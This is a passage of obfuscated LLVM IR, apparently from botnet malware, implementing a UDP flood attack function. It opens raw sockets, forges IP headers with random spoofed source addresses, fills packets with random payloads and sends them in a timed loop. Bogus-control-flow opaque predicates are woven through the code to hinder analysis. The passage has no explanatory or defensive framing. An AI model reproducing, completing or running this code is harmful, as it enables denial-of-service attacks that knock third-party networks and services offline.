  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %577

; <label>:84:                                     ; preds = %62
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 3
  %86 = getelementptr inbounds [8 x i8], [8 x i8]* %85, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %86, i8 0, i64 8, i32 4, i1 false)
  %87 = load i32, i32* %22, align 4
  store i32 %87, i32* %26, align 4
  %88 = load i32, i32* %20, align 4
  %89 = icmp eq i32 %88, 32
  br i1 %89, label %90, label %262

; <label>:90:                                     ; preds = %84
  %91 = load i32, i32* @x.85
  %92 = load i32, i32* @y.86
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %90
  %99 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %99, i32* %27, align 4
  %100 = load i32, i32* %27, align 4
  %101 = icmp ne i32 %100, 0
  %102 = load i32, i32* @x.85
  %103 = load i32, i32* @y.86
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %101, label %111, label %110

; <label>:110:                                    ; preds = %originalBBpart28
  br label %577

; <label>:111:                                    ; preds = %originalBBpart28
  %112 = load i32, i32* %21, align 4
  %113 = add nsw i32 %112, 1
  %114 = sext i32 %113 to i64
  %115 = call noalias i8* @malloc(i64 %114) #2
  store i8* %115, i8** %28, align 8
  %116 = load i8*, i8** %28, align 8
  %117 = icmp eq i8* %116, null
  br i1 %117, label %118, label %135

; <label>:118:                                    ; preds = %111
  %119 = load i32, i32* @x.85
  %120 = load i32, i32* @y.86
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %118
  %127 = load i32, i32* @x.85
  %128 = load i32, i32* @y.86
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %577

; <label>:135:                                    ; preds = %111
  %136 = load i32, i32* @x.85
  %137 = load i32, i32* @y.86
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %135
  %144 = load i8*, i8** %28, align 8
  %145 = load i32, i32* %21, align 4
  %146 = add nsw i32 %145, 1
  %147 = sext i32 %146 to i64
  call void @llvm.memset.p0i8.i64(i8* %144, i8 0, i64 %147, i32 1, i1 false)
  %148 = load i8*, i8** %28, align 8
  %149 = load i32, i32* %21, align 4
  call void @makeRandomStr(i8* %148, i32 %149)
  %150 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %151 = load i32, i32* %19, align 4
  %152 = add nsw i32 %150, %151
  store i32 %152, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 0, i32* %31, align 4
  %153 = load i32, i32* @x.85
  %154 = load i32, i32* @y.86
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart224, label %originalBB14alteredBB

originalBBpart224:                                ; preds = %originalBB14
  br label %161

; <label>:161:                                    ; preds = %242, %238, %originalBBpart232, %originalBBpart224
  %162 = load i32, i32* %27, align 4
  %163 = load i8*, i8** %28, align 8
  %164 = load i32, i32* %21, align 4
  %165 = sext i32 %164 to i64
  %166 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  %167 = call i64 @sendto(i32 %162, i8* %163, i64 %165, i32 0, %struct.sockaddr* %166, i32 16)
  %168 = load i32, i32* %30, align 4
  %169 = load i32, i32* %26, align 4
  %170 = icmp eq i32 %168, %169
  br i1 %170, label %171, label %216

; <label>:171:                                    ; preds = %161
  %172 = load i32, i32* %18, align 4
  %173 = icmp eq i32 %172, 0
  br i1 %173, label %174, label %178

; <label>:174:                                    ; preds = %171
  %175 = call i32 @rand_cmwc()
  %176 = trunc i32 %175 to i16
  %177 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %176, i16* %177, align 2
  br label %178

; <label>:178:                                    ; preds = %174, %171
  %179 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %180 = load i32, i32* %29, align 4
  %181 = icmp sgt i32 %179, %180
  br i1 %181, label %182, label %199

; <label>:182:                                    ; preds = %178
  %183 = load i32, i32* @x.85
  %184 = load i32, i32* @y.86
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %182
  %191 = load i32, i32* @x.85
  %192 = load i32, i32* @y.86
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %245

; <label>:199:                                    ; preds = %178
  %200 = load i32, i32* @x.85
  %201 = load i32, i32* @y.86
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %199
  store i32 0, i32* %30, align 4
  %208 = load i32, i32* @x.85
  %209 = load i32, i32* @y.86
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %161

; <label>:216:                                    ; preds = %161
  %217 = load i32, i32* @x.85
  %218 = load i32, i32* @y.86
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %216
  %225 = load i32, i32* %30, align 4
  %226 = add i32 %225, 1
  store i32 %226, i32* %30, align 4
  %227 = load i32, i32* %31, align 4
  %228 = load i32, i32* %23, align 4
  %229 = icmp eq i32 %227, %228
  %230 = load i32, i32* @x.85
  %231 = load i32, i32* @y.86
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart249, label %originalBB34alteredBB

originalBBpart249:                                ; preds = %originalBB34
  br i1 %229, label %238, label %242

; <label>:238:                                    ; preds = %originalBBpart249
  %239 = load i32, i32* %24, align 4
  %240 = mul nsw i32 %239, 1000
  %241 = call i32 @usleep(i32 %240)
  store i32 0, i32* %31, align 4
  br label %161

; <label>:242:                                    ; preds = %originalBBpart249
  %243 = load i32, i32* %31, align 4
  %244 = add i32 %243, 1
  store i32 %244, i32* %31, align 4
  br label %161

; <label>:245:                                    ; preds = %originalBBpart228
  %246 = load i32, i32* @x.85
  %247 = load i32, i32* @y.86
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %245
  %254 = load i32, i32* @x.85
  %255 = load i32, i32* @y.86
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %577

; <label>:262:                                    ; preds = %84
  %263 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %263, i32* %32, align 4
  %264 = load i32, i32* %32, align 4
  %265 = icmp ne i32 %264, 0
  br i1 %265, label %267, label %266

; <label>:266:                                    ; preds = %262
  br label %577

; <label>:267:                                    ; preds = %262
  store i32 1, i32* %33, align 4
  %268 = load i32, i32* %32, align 4
  %269 = bitcast i32* %33 to i8*
  %270 = call i32 @setsockopt(i32 %268, i32 0, i32 3, i8* %269, i32 4) #2
  %271 = icmp slt i32 %270, 0
  br i1 %271, label %272, label %273

; <label>:272:                                    ; preds = %267
  br label %577

; <label>:273:                                    ; preds = %267
  store i32 50, i32* %34, align 4
  br label %274

; <label>:274:                                    ; preds = %originalBBpart261, %273
  %275 = load i32, i32* %34, align 4
  %276 = add nsw i32 %275, -1
  store i32 %276, i32* %34, align 4
  %277 = icmp ne i32 %275, 0
  br i1 %277, label %278, label %299

; <label>:278:                                    ; preds = %274
  %279 = load i32, i32* @x.85
  %280 = load i32, i32* @y.86
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %278
  %287 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %288 = call i32 @rand_cmwc()
  %289 = xor i32 %287, %288
  call void @srand(i32 %289) #2
  %290 = call i32 @rand() #2
  call void @init_rand(i32 %290)
  %291 = load i32, i32* @x.85
  %292 = load i32, i32* @y.86
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBBpart261, label %originalBB55alteredBB

originalBBpart261:                                ; preds = %originalBB55
  br label %274

; <label>:299:                                    ; preds = %274
  %300 = load i32, i32* @x.85
  %301 = load i32, i32* @y.86
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %299
  %308 = load i32, i32* %20, align 4
  %309 = icmp eq i32 %308, 0
  %310 = load i32, i32* @x.85
  %311 = load i32, i32* @y.86
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br i1 %309, label %318, label %335

; <label>:318:                                    ; preds = %originalBBpart265
  %319 = load i32, i32* @x.85
  %320 = load i32, i32* @y.86
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %318
  store i32 0, i32* %35, align 4
  %327 = load i32, i32* @x.85
  %328 = load i32, i32* @y.86
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %357

; <label>:335:                                    ; preds = %originalBBpart265
  %336 = load i32, i32* @x.85
  %337 = load i32, i32* @y.86
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %335
  %344 = load i32, i32* %20, align 4
  %345 = sub nsw i32 32, %344
  %346 = shl i32 1, %345
  %347 = sub nsw i32 %346, 1
  %348 = xor i32 %347, -1
  store i32 %348, i32* %35, align 4
  %349 = load i32, i32* @x.85
  %350 = load i32, i32* @y.86
  %351 = sub i32 %349, 1
  %352 = mul i32 %349, %351
  %353 = urem i32 %352, 2
  %354 = icmp eq i32 %353, 0
  %355 = icmp slt i32 %350, 10
  %356 = or i1 %354, %355
  br i1 %356, label %originalBBpart2103, label %originalBB71alteredBB

originalBBpart2103:                               ; preds = %originalBB71
  br label %357

; <label>:357:                                    ; preds = %originalBBpart2103, %originalBBpart269
  %358 = load i32, i32* %21, align 4
  %359 = sext i32 %358 to i64
  %360 = add i64 28, %359
  %361 = call i8* @llvm.stacksave()
  store i8* %361, i8** %36, align 8
  %362 = alloca i8, i64 %360, align 16
  %363 = bitcast i8* %362 to %struct.iphdr*
  store %struct.iphdr* %363, %struct.iphdr** %37, align 8
  %364 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %365 = bitcast %struct.iphdr* %364 to i8*
  %366 = getelementptr i8, i8* %365, i64 20
  %367 = bitcast i8* %366 to %struct.udphdr*
  store %struct.udphdr* %367, %struct.udphdr** %38, align 8
  %368 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %369 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 2
  %370 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %369, i32 0, i32 0
  %371 = load i32, i32* %370, align 4
  %372 = load i32, i32* %35, align 4
  %373 = call i32 @GetRandomIP(i32 %372)
  %374 = call i32 @htonl(i32 %373) #13
  %375 = load i32, i32* %21, align 4
  %376 = sext i32 %375 to i64
  %377 = add i64 8, %376
  %378 = trunc i64 %377 to i32
  call void @makeIPPacket(%struct.iphdr* %368, i32 %371, i32 %374, i8 zeroext 17, i32 %378)
  %379 = load i32, i32* %21, align 4
  %380 = sext i32 %379 to i64
  %381 = add i64 8, %380
  %382 = trunc i64 %381 to i16
  %383 = call zeroext i16 @htons(i16 zeroext %382) #13
  %384 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %385 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %384, i32 0, i32 0
  %386 = bitcast %union.anon.2* %385 to %struct.anon.3*
  %387 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %386, i32 0, i32 2
  store i16 %383, i16* %387, align 2
  %388 = call i32 @rand_cmwc()
  %389 = trunc i32 %388 to i16
  %390 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %391 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %390, i32 0, i32 0
  %392 = bitcast %union.anon.2* %391 to %struct.anon.3*
  %393 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %392, i32 0, i32 0
  store i16 %389, i16* %393, align 2
  %394 = load i32, i32* %18, align 4
  %395 = icmp eq i32 %394, 0
  br i1 %395, label %396, label %414

; <label>:396:                                    ; preds = %357
  %397 = load i32, i32* @x.85
  %398 = load i32, i32* @y.86
  %399 = sub i32 %397, 1
  %400 = mul i32 %397, %399
  %401 = urem i32 %400, 2
  %402 = icmp eq i32 %401, 0
  %403 = icmp slt i32 %398, 10
  %404 = or i1 %402, %403
  br i1 %404, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %396
  %405 = call i32 @rand_cmwc()
  %406 = load i32, i32* @x.85
  %407 = load i32, i32* @y.86
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br label %419

; <label>:414:                                    ; preds = %357
  %415 = load i32, i32* %18, align 4
  %416 = trunc i32 %415 to i16
  %417 = call zeroext i16 @htons(i16 zeroext %416) #13
  %418 = zext i16 %417 to i32
  br label %419

; <label>:419:                                    ; preds = %414, %originalBBpart2107
  %420 = phi i32 [ %405, %originalBBpart2107 ], [ %418, %414 ]
  %421 = trunc i32 %420 to i16
  %422 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %423 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %422, i32 0, i32 0
  %424 = bitcast %union.anon.2* %423 to %struct.anon.3*
  %425 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %424, i32 0, i32 1
  store i16 %421, i16* %425, align 2
  %426 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %427 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %426, i32 0, i32 0
  %428 = bitcast %union.anon.2* %427 to %struct.anon.3*
  %429 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %428, i32 0, i32 3
  store i16 0, i16* %429, align 2
  %430 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %431 = bitcast %struct.udphdr* %430 to i8*
  %432 = getelementptr inbounds i8, i8* %431, i64 8
  %433 = load i32, i32* %21, align 4
  call void @makeRandomStr(i8* %432, i32 %433)
  %434 = bitcast i8* %362 to i16*
  %435 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %436 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %435, i32 0, i32 2
  %437 = load i16, i16* %436, align 2
  %438 = zext i16 %437 to i32
  %439 = call zeroext i16 @csum(i16* %434, i32 %438)
  %440 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %441 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %440, i32 0, i32 7
  store i16 %439, i16* %441, align 2
  %442 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %443 = load i32, i32* %19, align 4
  %444 = add nsw i32 %442, %443
  store i32 %444, i32* %39, align 4
  store i32 0, i32* %40, align 4
  store i32 0, i32* %41, align 4
  br label %445

; <label>:445:                                    ; preds = %originalBBpart2140, %552, %originalBBpart2115, %419
  br label %446

; <label>:446:                                    ; preds = %445
  %447 = load i32, i32* %32, align 4
  %448 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  %449 = call i64 @sendto(i32 %447, i8* %362, i64 %360, i32 0, %struct.sockaddr* %448, i32 16)
  %450 = call i32 @rand_cmwc()
  %451 = trunc i32 %450 to i16
  %452 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %453 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %452, i32 0, i32 0
  %454 = bitcast %union.anon.2* %453 to %struct.anon.3*
  %455 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %454, i32 0, i32 0
  store i16 %451, i16* %455, align 2
  %456 = load i32, i32* %18, align 4
  %457 = icmp eq i32 %456, 0
  br i1 %457, label %458, label %460

; <label>:458:                                    ; preds = %446
  %459 = call i32 @rand_cmwc()
  br label %465

; <label>:460:                                    ; preds = %446
  %461 = load i32, i32* %18, align 4
  %462 = trunc i32 %461 to i16
  %463 = call zeroext i16 @htons(i16 zeroext %462) #13
  %464 = zext i16 %463 to i32
  br label %465

; <label>:465:                                    ; preds = %460, %458
  %466 = phi i32 [ %459, %458 ], [ %464, %460 ]
  %467 = trunc i32 %466 to i16
  %468 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %469 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %468, i32 0, i32 0
  %470 = bitcast %union.anon.2* %469 to %struct.anon.3*
  %471 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %470, i32 0, i32 1
  store i16 %467, i16* %471, align 2
  %472 = call i32 @rand_cmwc()
  %473 = trunc i32 %472 to i16
  %474 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %475 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %474, i32 0, i32 3
  store i16 %473, i16* %475, align 4
  %476 = load i32, i32* %35, align 4
  %477 = call i32 @GetRandomIP(i32 %476)
  %478 = call i32 @htonl(i32 %477) #13
  %479 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %480 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %479, i32 0, i32 8
  store i32 %478, i32* %480, align 4
  %481 = bitcast i8* %362 to i16*
  %482 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %483 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %482, i32 0, i32 2
  %484 = load i16, i16* %483, align 2
  %485 = zext i16 %484 to i32
  %486 = call zeroext i16 @csum(i16* %481, i32 %485)
  %487 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %488 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %487, i32 0, i32 7
  store i16 %486, i16* %488, align 2
  %489 = load i32, i32* %40, align 4
  %490 = load i32, i32* %26, align 4
  %491 = icmp eq i32 %489, %490
  br i1 %491, label %492, label %530

; <label>:492:                                    ; preds = %465
  %493 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %494 = load i32, i32* %39, align 4
  %495 = icmp sgt i32 %493, %494
  br i1 %495, label %496, label %513

; <label>:496:                                    ; preds = %492
  %497 = load i32, i32* @x.85
  %498 = load i32, i32* @y.86
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %496
  %505 = load i32, i32* @x.85
  %506 = load i32, i32* @y.86
  %507 = sub i32 %505, 1
  %508 = mul i32 %505, %507
  %509 = urem i32 %508, 2
  %510 = icmp eq i32 %509, 0
  %511 = icmp slt i32 %506, 10
  %512 = or i1 %510, %511
  br i1 %512, label %originalBBpart2111, label %originalBB109alteredBB

originalBBpart2111:                               ; preds = %originalBB109
  br label %575

; <label>:513:                                    ; preds = %492
  %514 = load i32, i32* @x.85
  %515 = load i32, i32* @y.86
  %516 = sub i32 %514, 1
  %517 = mul i32 %514, %516
  %518 = urem i32 %517, 2
  %519 = icmp eq i32 %518, 0
  %520 = icmp slt i32 %515, 10
  %521 = or i1 %519, %520
  br i1 %521, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %513
  store i32 0, i32* %40, align 4
  %522 = load i32, i32* @x.85
  %523 = load i32, i32* @y.86
  %524 = sub i32 %522, 1
  %525 = mul i32 %522, %524
  %526 = urem i32 %525, 2
  %527 = icmp eq i32 %526, 0
  %528 = icmp slt i32 %523, 10
  %529 = or i1 %527, %528
  br i1 %529, label %originalBBpart2115, label %originalBB113alteredBB

originalBBpart2115:                               ; preds = %originalBB113
  br label %445

; <label>:530:                                    ; preds = %465
  %531 = load i32, i32* @x.85
  %532 = load i32, i32* @y.86
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %530
  %539 = load i32, i32* %40, align 4
  %540 = add i32 %539, 1
  store i32 %540, i32* %40, align 4
  %541 = load i32, i32* %41, align 4
  %542 = load i32, i32* %23, align 4
  %543 = icmp eq i32 %541, %542
  %544 = load i32, i32* @x.85
  %545 = load i32, i32* @y.86
  %546 = sub i32 %544, 1
  %547 = mul i32 %544, %546
  %548 = urem i32 %547, 2
  %549 = icmp eq i32 %548, 0
  %550 = icmp slt i32 %545, 10
  %551 = or i1 %549, %550
  br i1 %551, label %originalBBpart2134, label %originalBB117alteredBB

originalBBpart2134:                               ; preds = %originalBB117
  br i1 %543, label %552, label %556

; <label>:552:                                    ; preds = %originalBBpart2134
  %553 = load i32, i32* %24, align 4
  %554 = mul nsw i32 %553, 1000
  %555 = call i32 @usleep(i32 %554)
  store i32 0, i32* %41, align 4
  br label %445

; <label>:556:                                    ; preds = %originalBBpart2134
  %557 = load i32, i32* @x.85
  %558 = load i32, i32* @y.86
  %559 = sub i32 %557, 1
  %560 = mul i32 %557, %559
  %561 = urem i32 %560, 2
  %562 = icmp eq i32 %561, 0
  %563 = icmp slt i32 %558, 10
  %564 = or i1 %562, %563
  br i1 %564, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %556
  %565 = load i32, i32* %41, align 4
  %566 = add i32 %565, 1
  store i32 %566, i32* %41, align 4
  %567 = load i32, i32* @x.85
  %568 = load i32, i32* @y.86
  %569 = sub i32 %567, 1
  %570 = mul i32 %567, %569
  %571 = urem i32 %570, 2
  %572 = icmp eq i32 %571, 0
  %573 = icmp slt i32 %568, 10
  %574 = or i1 %572, %573
  br i1 %574, label %originalBBpart2140, label %originalBB136alteredBB

originalBBpart2140:                               ; preds = %originalBB136
  br label %445

; <label>:575:                                    ; preds = %originalBBpart2111
  %576 = load i8*, i8** %36, align 8
  call void @llvm.stackrestore(i8* %576)
  br label %577

; <label>:577:                                    ; preds = %575, %272, %266, %originalBBpart253, %originalBBpart212, %110, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %8
  %578 = alloca i8*, align 8
  %579 = alloca i32, align 4
  %580 = alloca i32, align 4
  %581 = alloca i32, align 4
  %582 = alloca i32, align 4
  %583 = alloca i32, align 4
  %584 = alloca i32, align 4
  %585 = alloca i32, align 4
  %586 = alloca %struct.sockaddr_in, align 4
  %587 = alloca i32, align 4
  %588 = alloca i32, align 4
  %589 = alloca i8*, align 8
  %590 = alloca i32, align 4
  %591 = alloca i32, align 4
  %592 = alloca i32, align 4
  %593 = alloca i32, align 4
  %594 = alloca i32, align 4
  %595 = alloca i32, align 4
  %596 = alloca i32, align 4
  %597 = alloca i8*, align 8
  %598 = alloca %struct.iphdr*, align 8
  %599 = alloca %struct.udphdr*, align 8
  %600 = alloca i32, align 4
  %601 = alloca i32, align 4
  %602 = alloca i32, align 4
  store i8* %0, i8** %578, align 8
  store i32 %1, i32* %579, align 4
  store i32 %2, i32* %580, align 4
  store i32 %3, i32* %581, align 4
  store i32 %4, i32* %582, align 4
  store i32 %5, i32* %583, align 4
  store i32 %6, i32* %584, align 4
  store i32 %7, i32* %585, align 4
  %603 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %586, i32 0, i32 0
  store i16 2, i16* %603, align 4
  %604 = load i32, i32* %579, align 4
  %605 = icmp eq i32 %604, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %67
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %90
  %606 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %606, i32* %27, align 4
  %607 = load i32, i32* %27, align 4
  %608 = icmp ne i32 %607, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %118
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %135
  %609 = load i8*, i8** %28, align 8
  %610 = load i32, i32* %21, align 4
  %_ = sub i32 0, %610
  %gen = add i32 %_, 1
  %_15 = shl i32 %610, 1
  %_16 = shl i32 %610, 1
  %_17 = sub i32 0, %610
  %gen18 = add i32 %_17, 1
  %611 = add nsw i32 %610, 1
  %612 = sext i32 %611 to i64
  call void @llvm.memset.p0i8.i64(i8* %609, i8 0, i64 %612, i32 1, i1 false)
  %613 = load i8*, i8** %28, align 8
  %614 = load i32, i32* %21, align 4
  call void @makeRandomStr(i8* %613, i32 %614)
  %615 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %616 = load i32, i32* %19, align 4
  %_19 = sub i32 %615, %616
  %gen20 = mul i32 %_19, %616
  %_21 = sub i32 0, %615
  %gen22 = add i32 %_21, %616
  %617 = add nsw i32 %615, %616
  store i32 %617, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 0, i32* %31, align 4
  br label %originalBB14

originalBB26alteredBB:                            ; preds = %originalBB26, %182
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %199
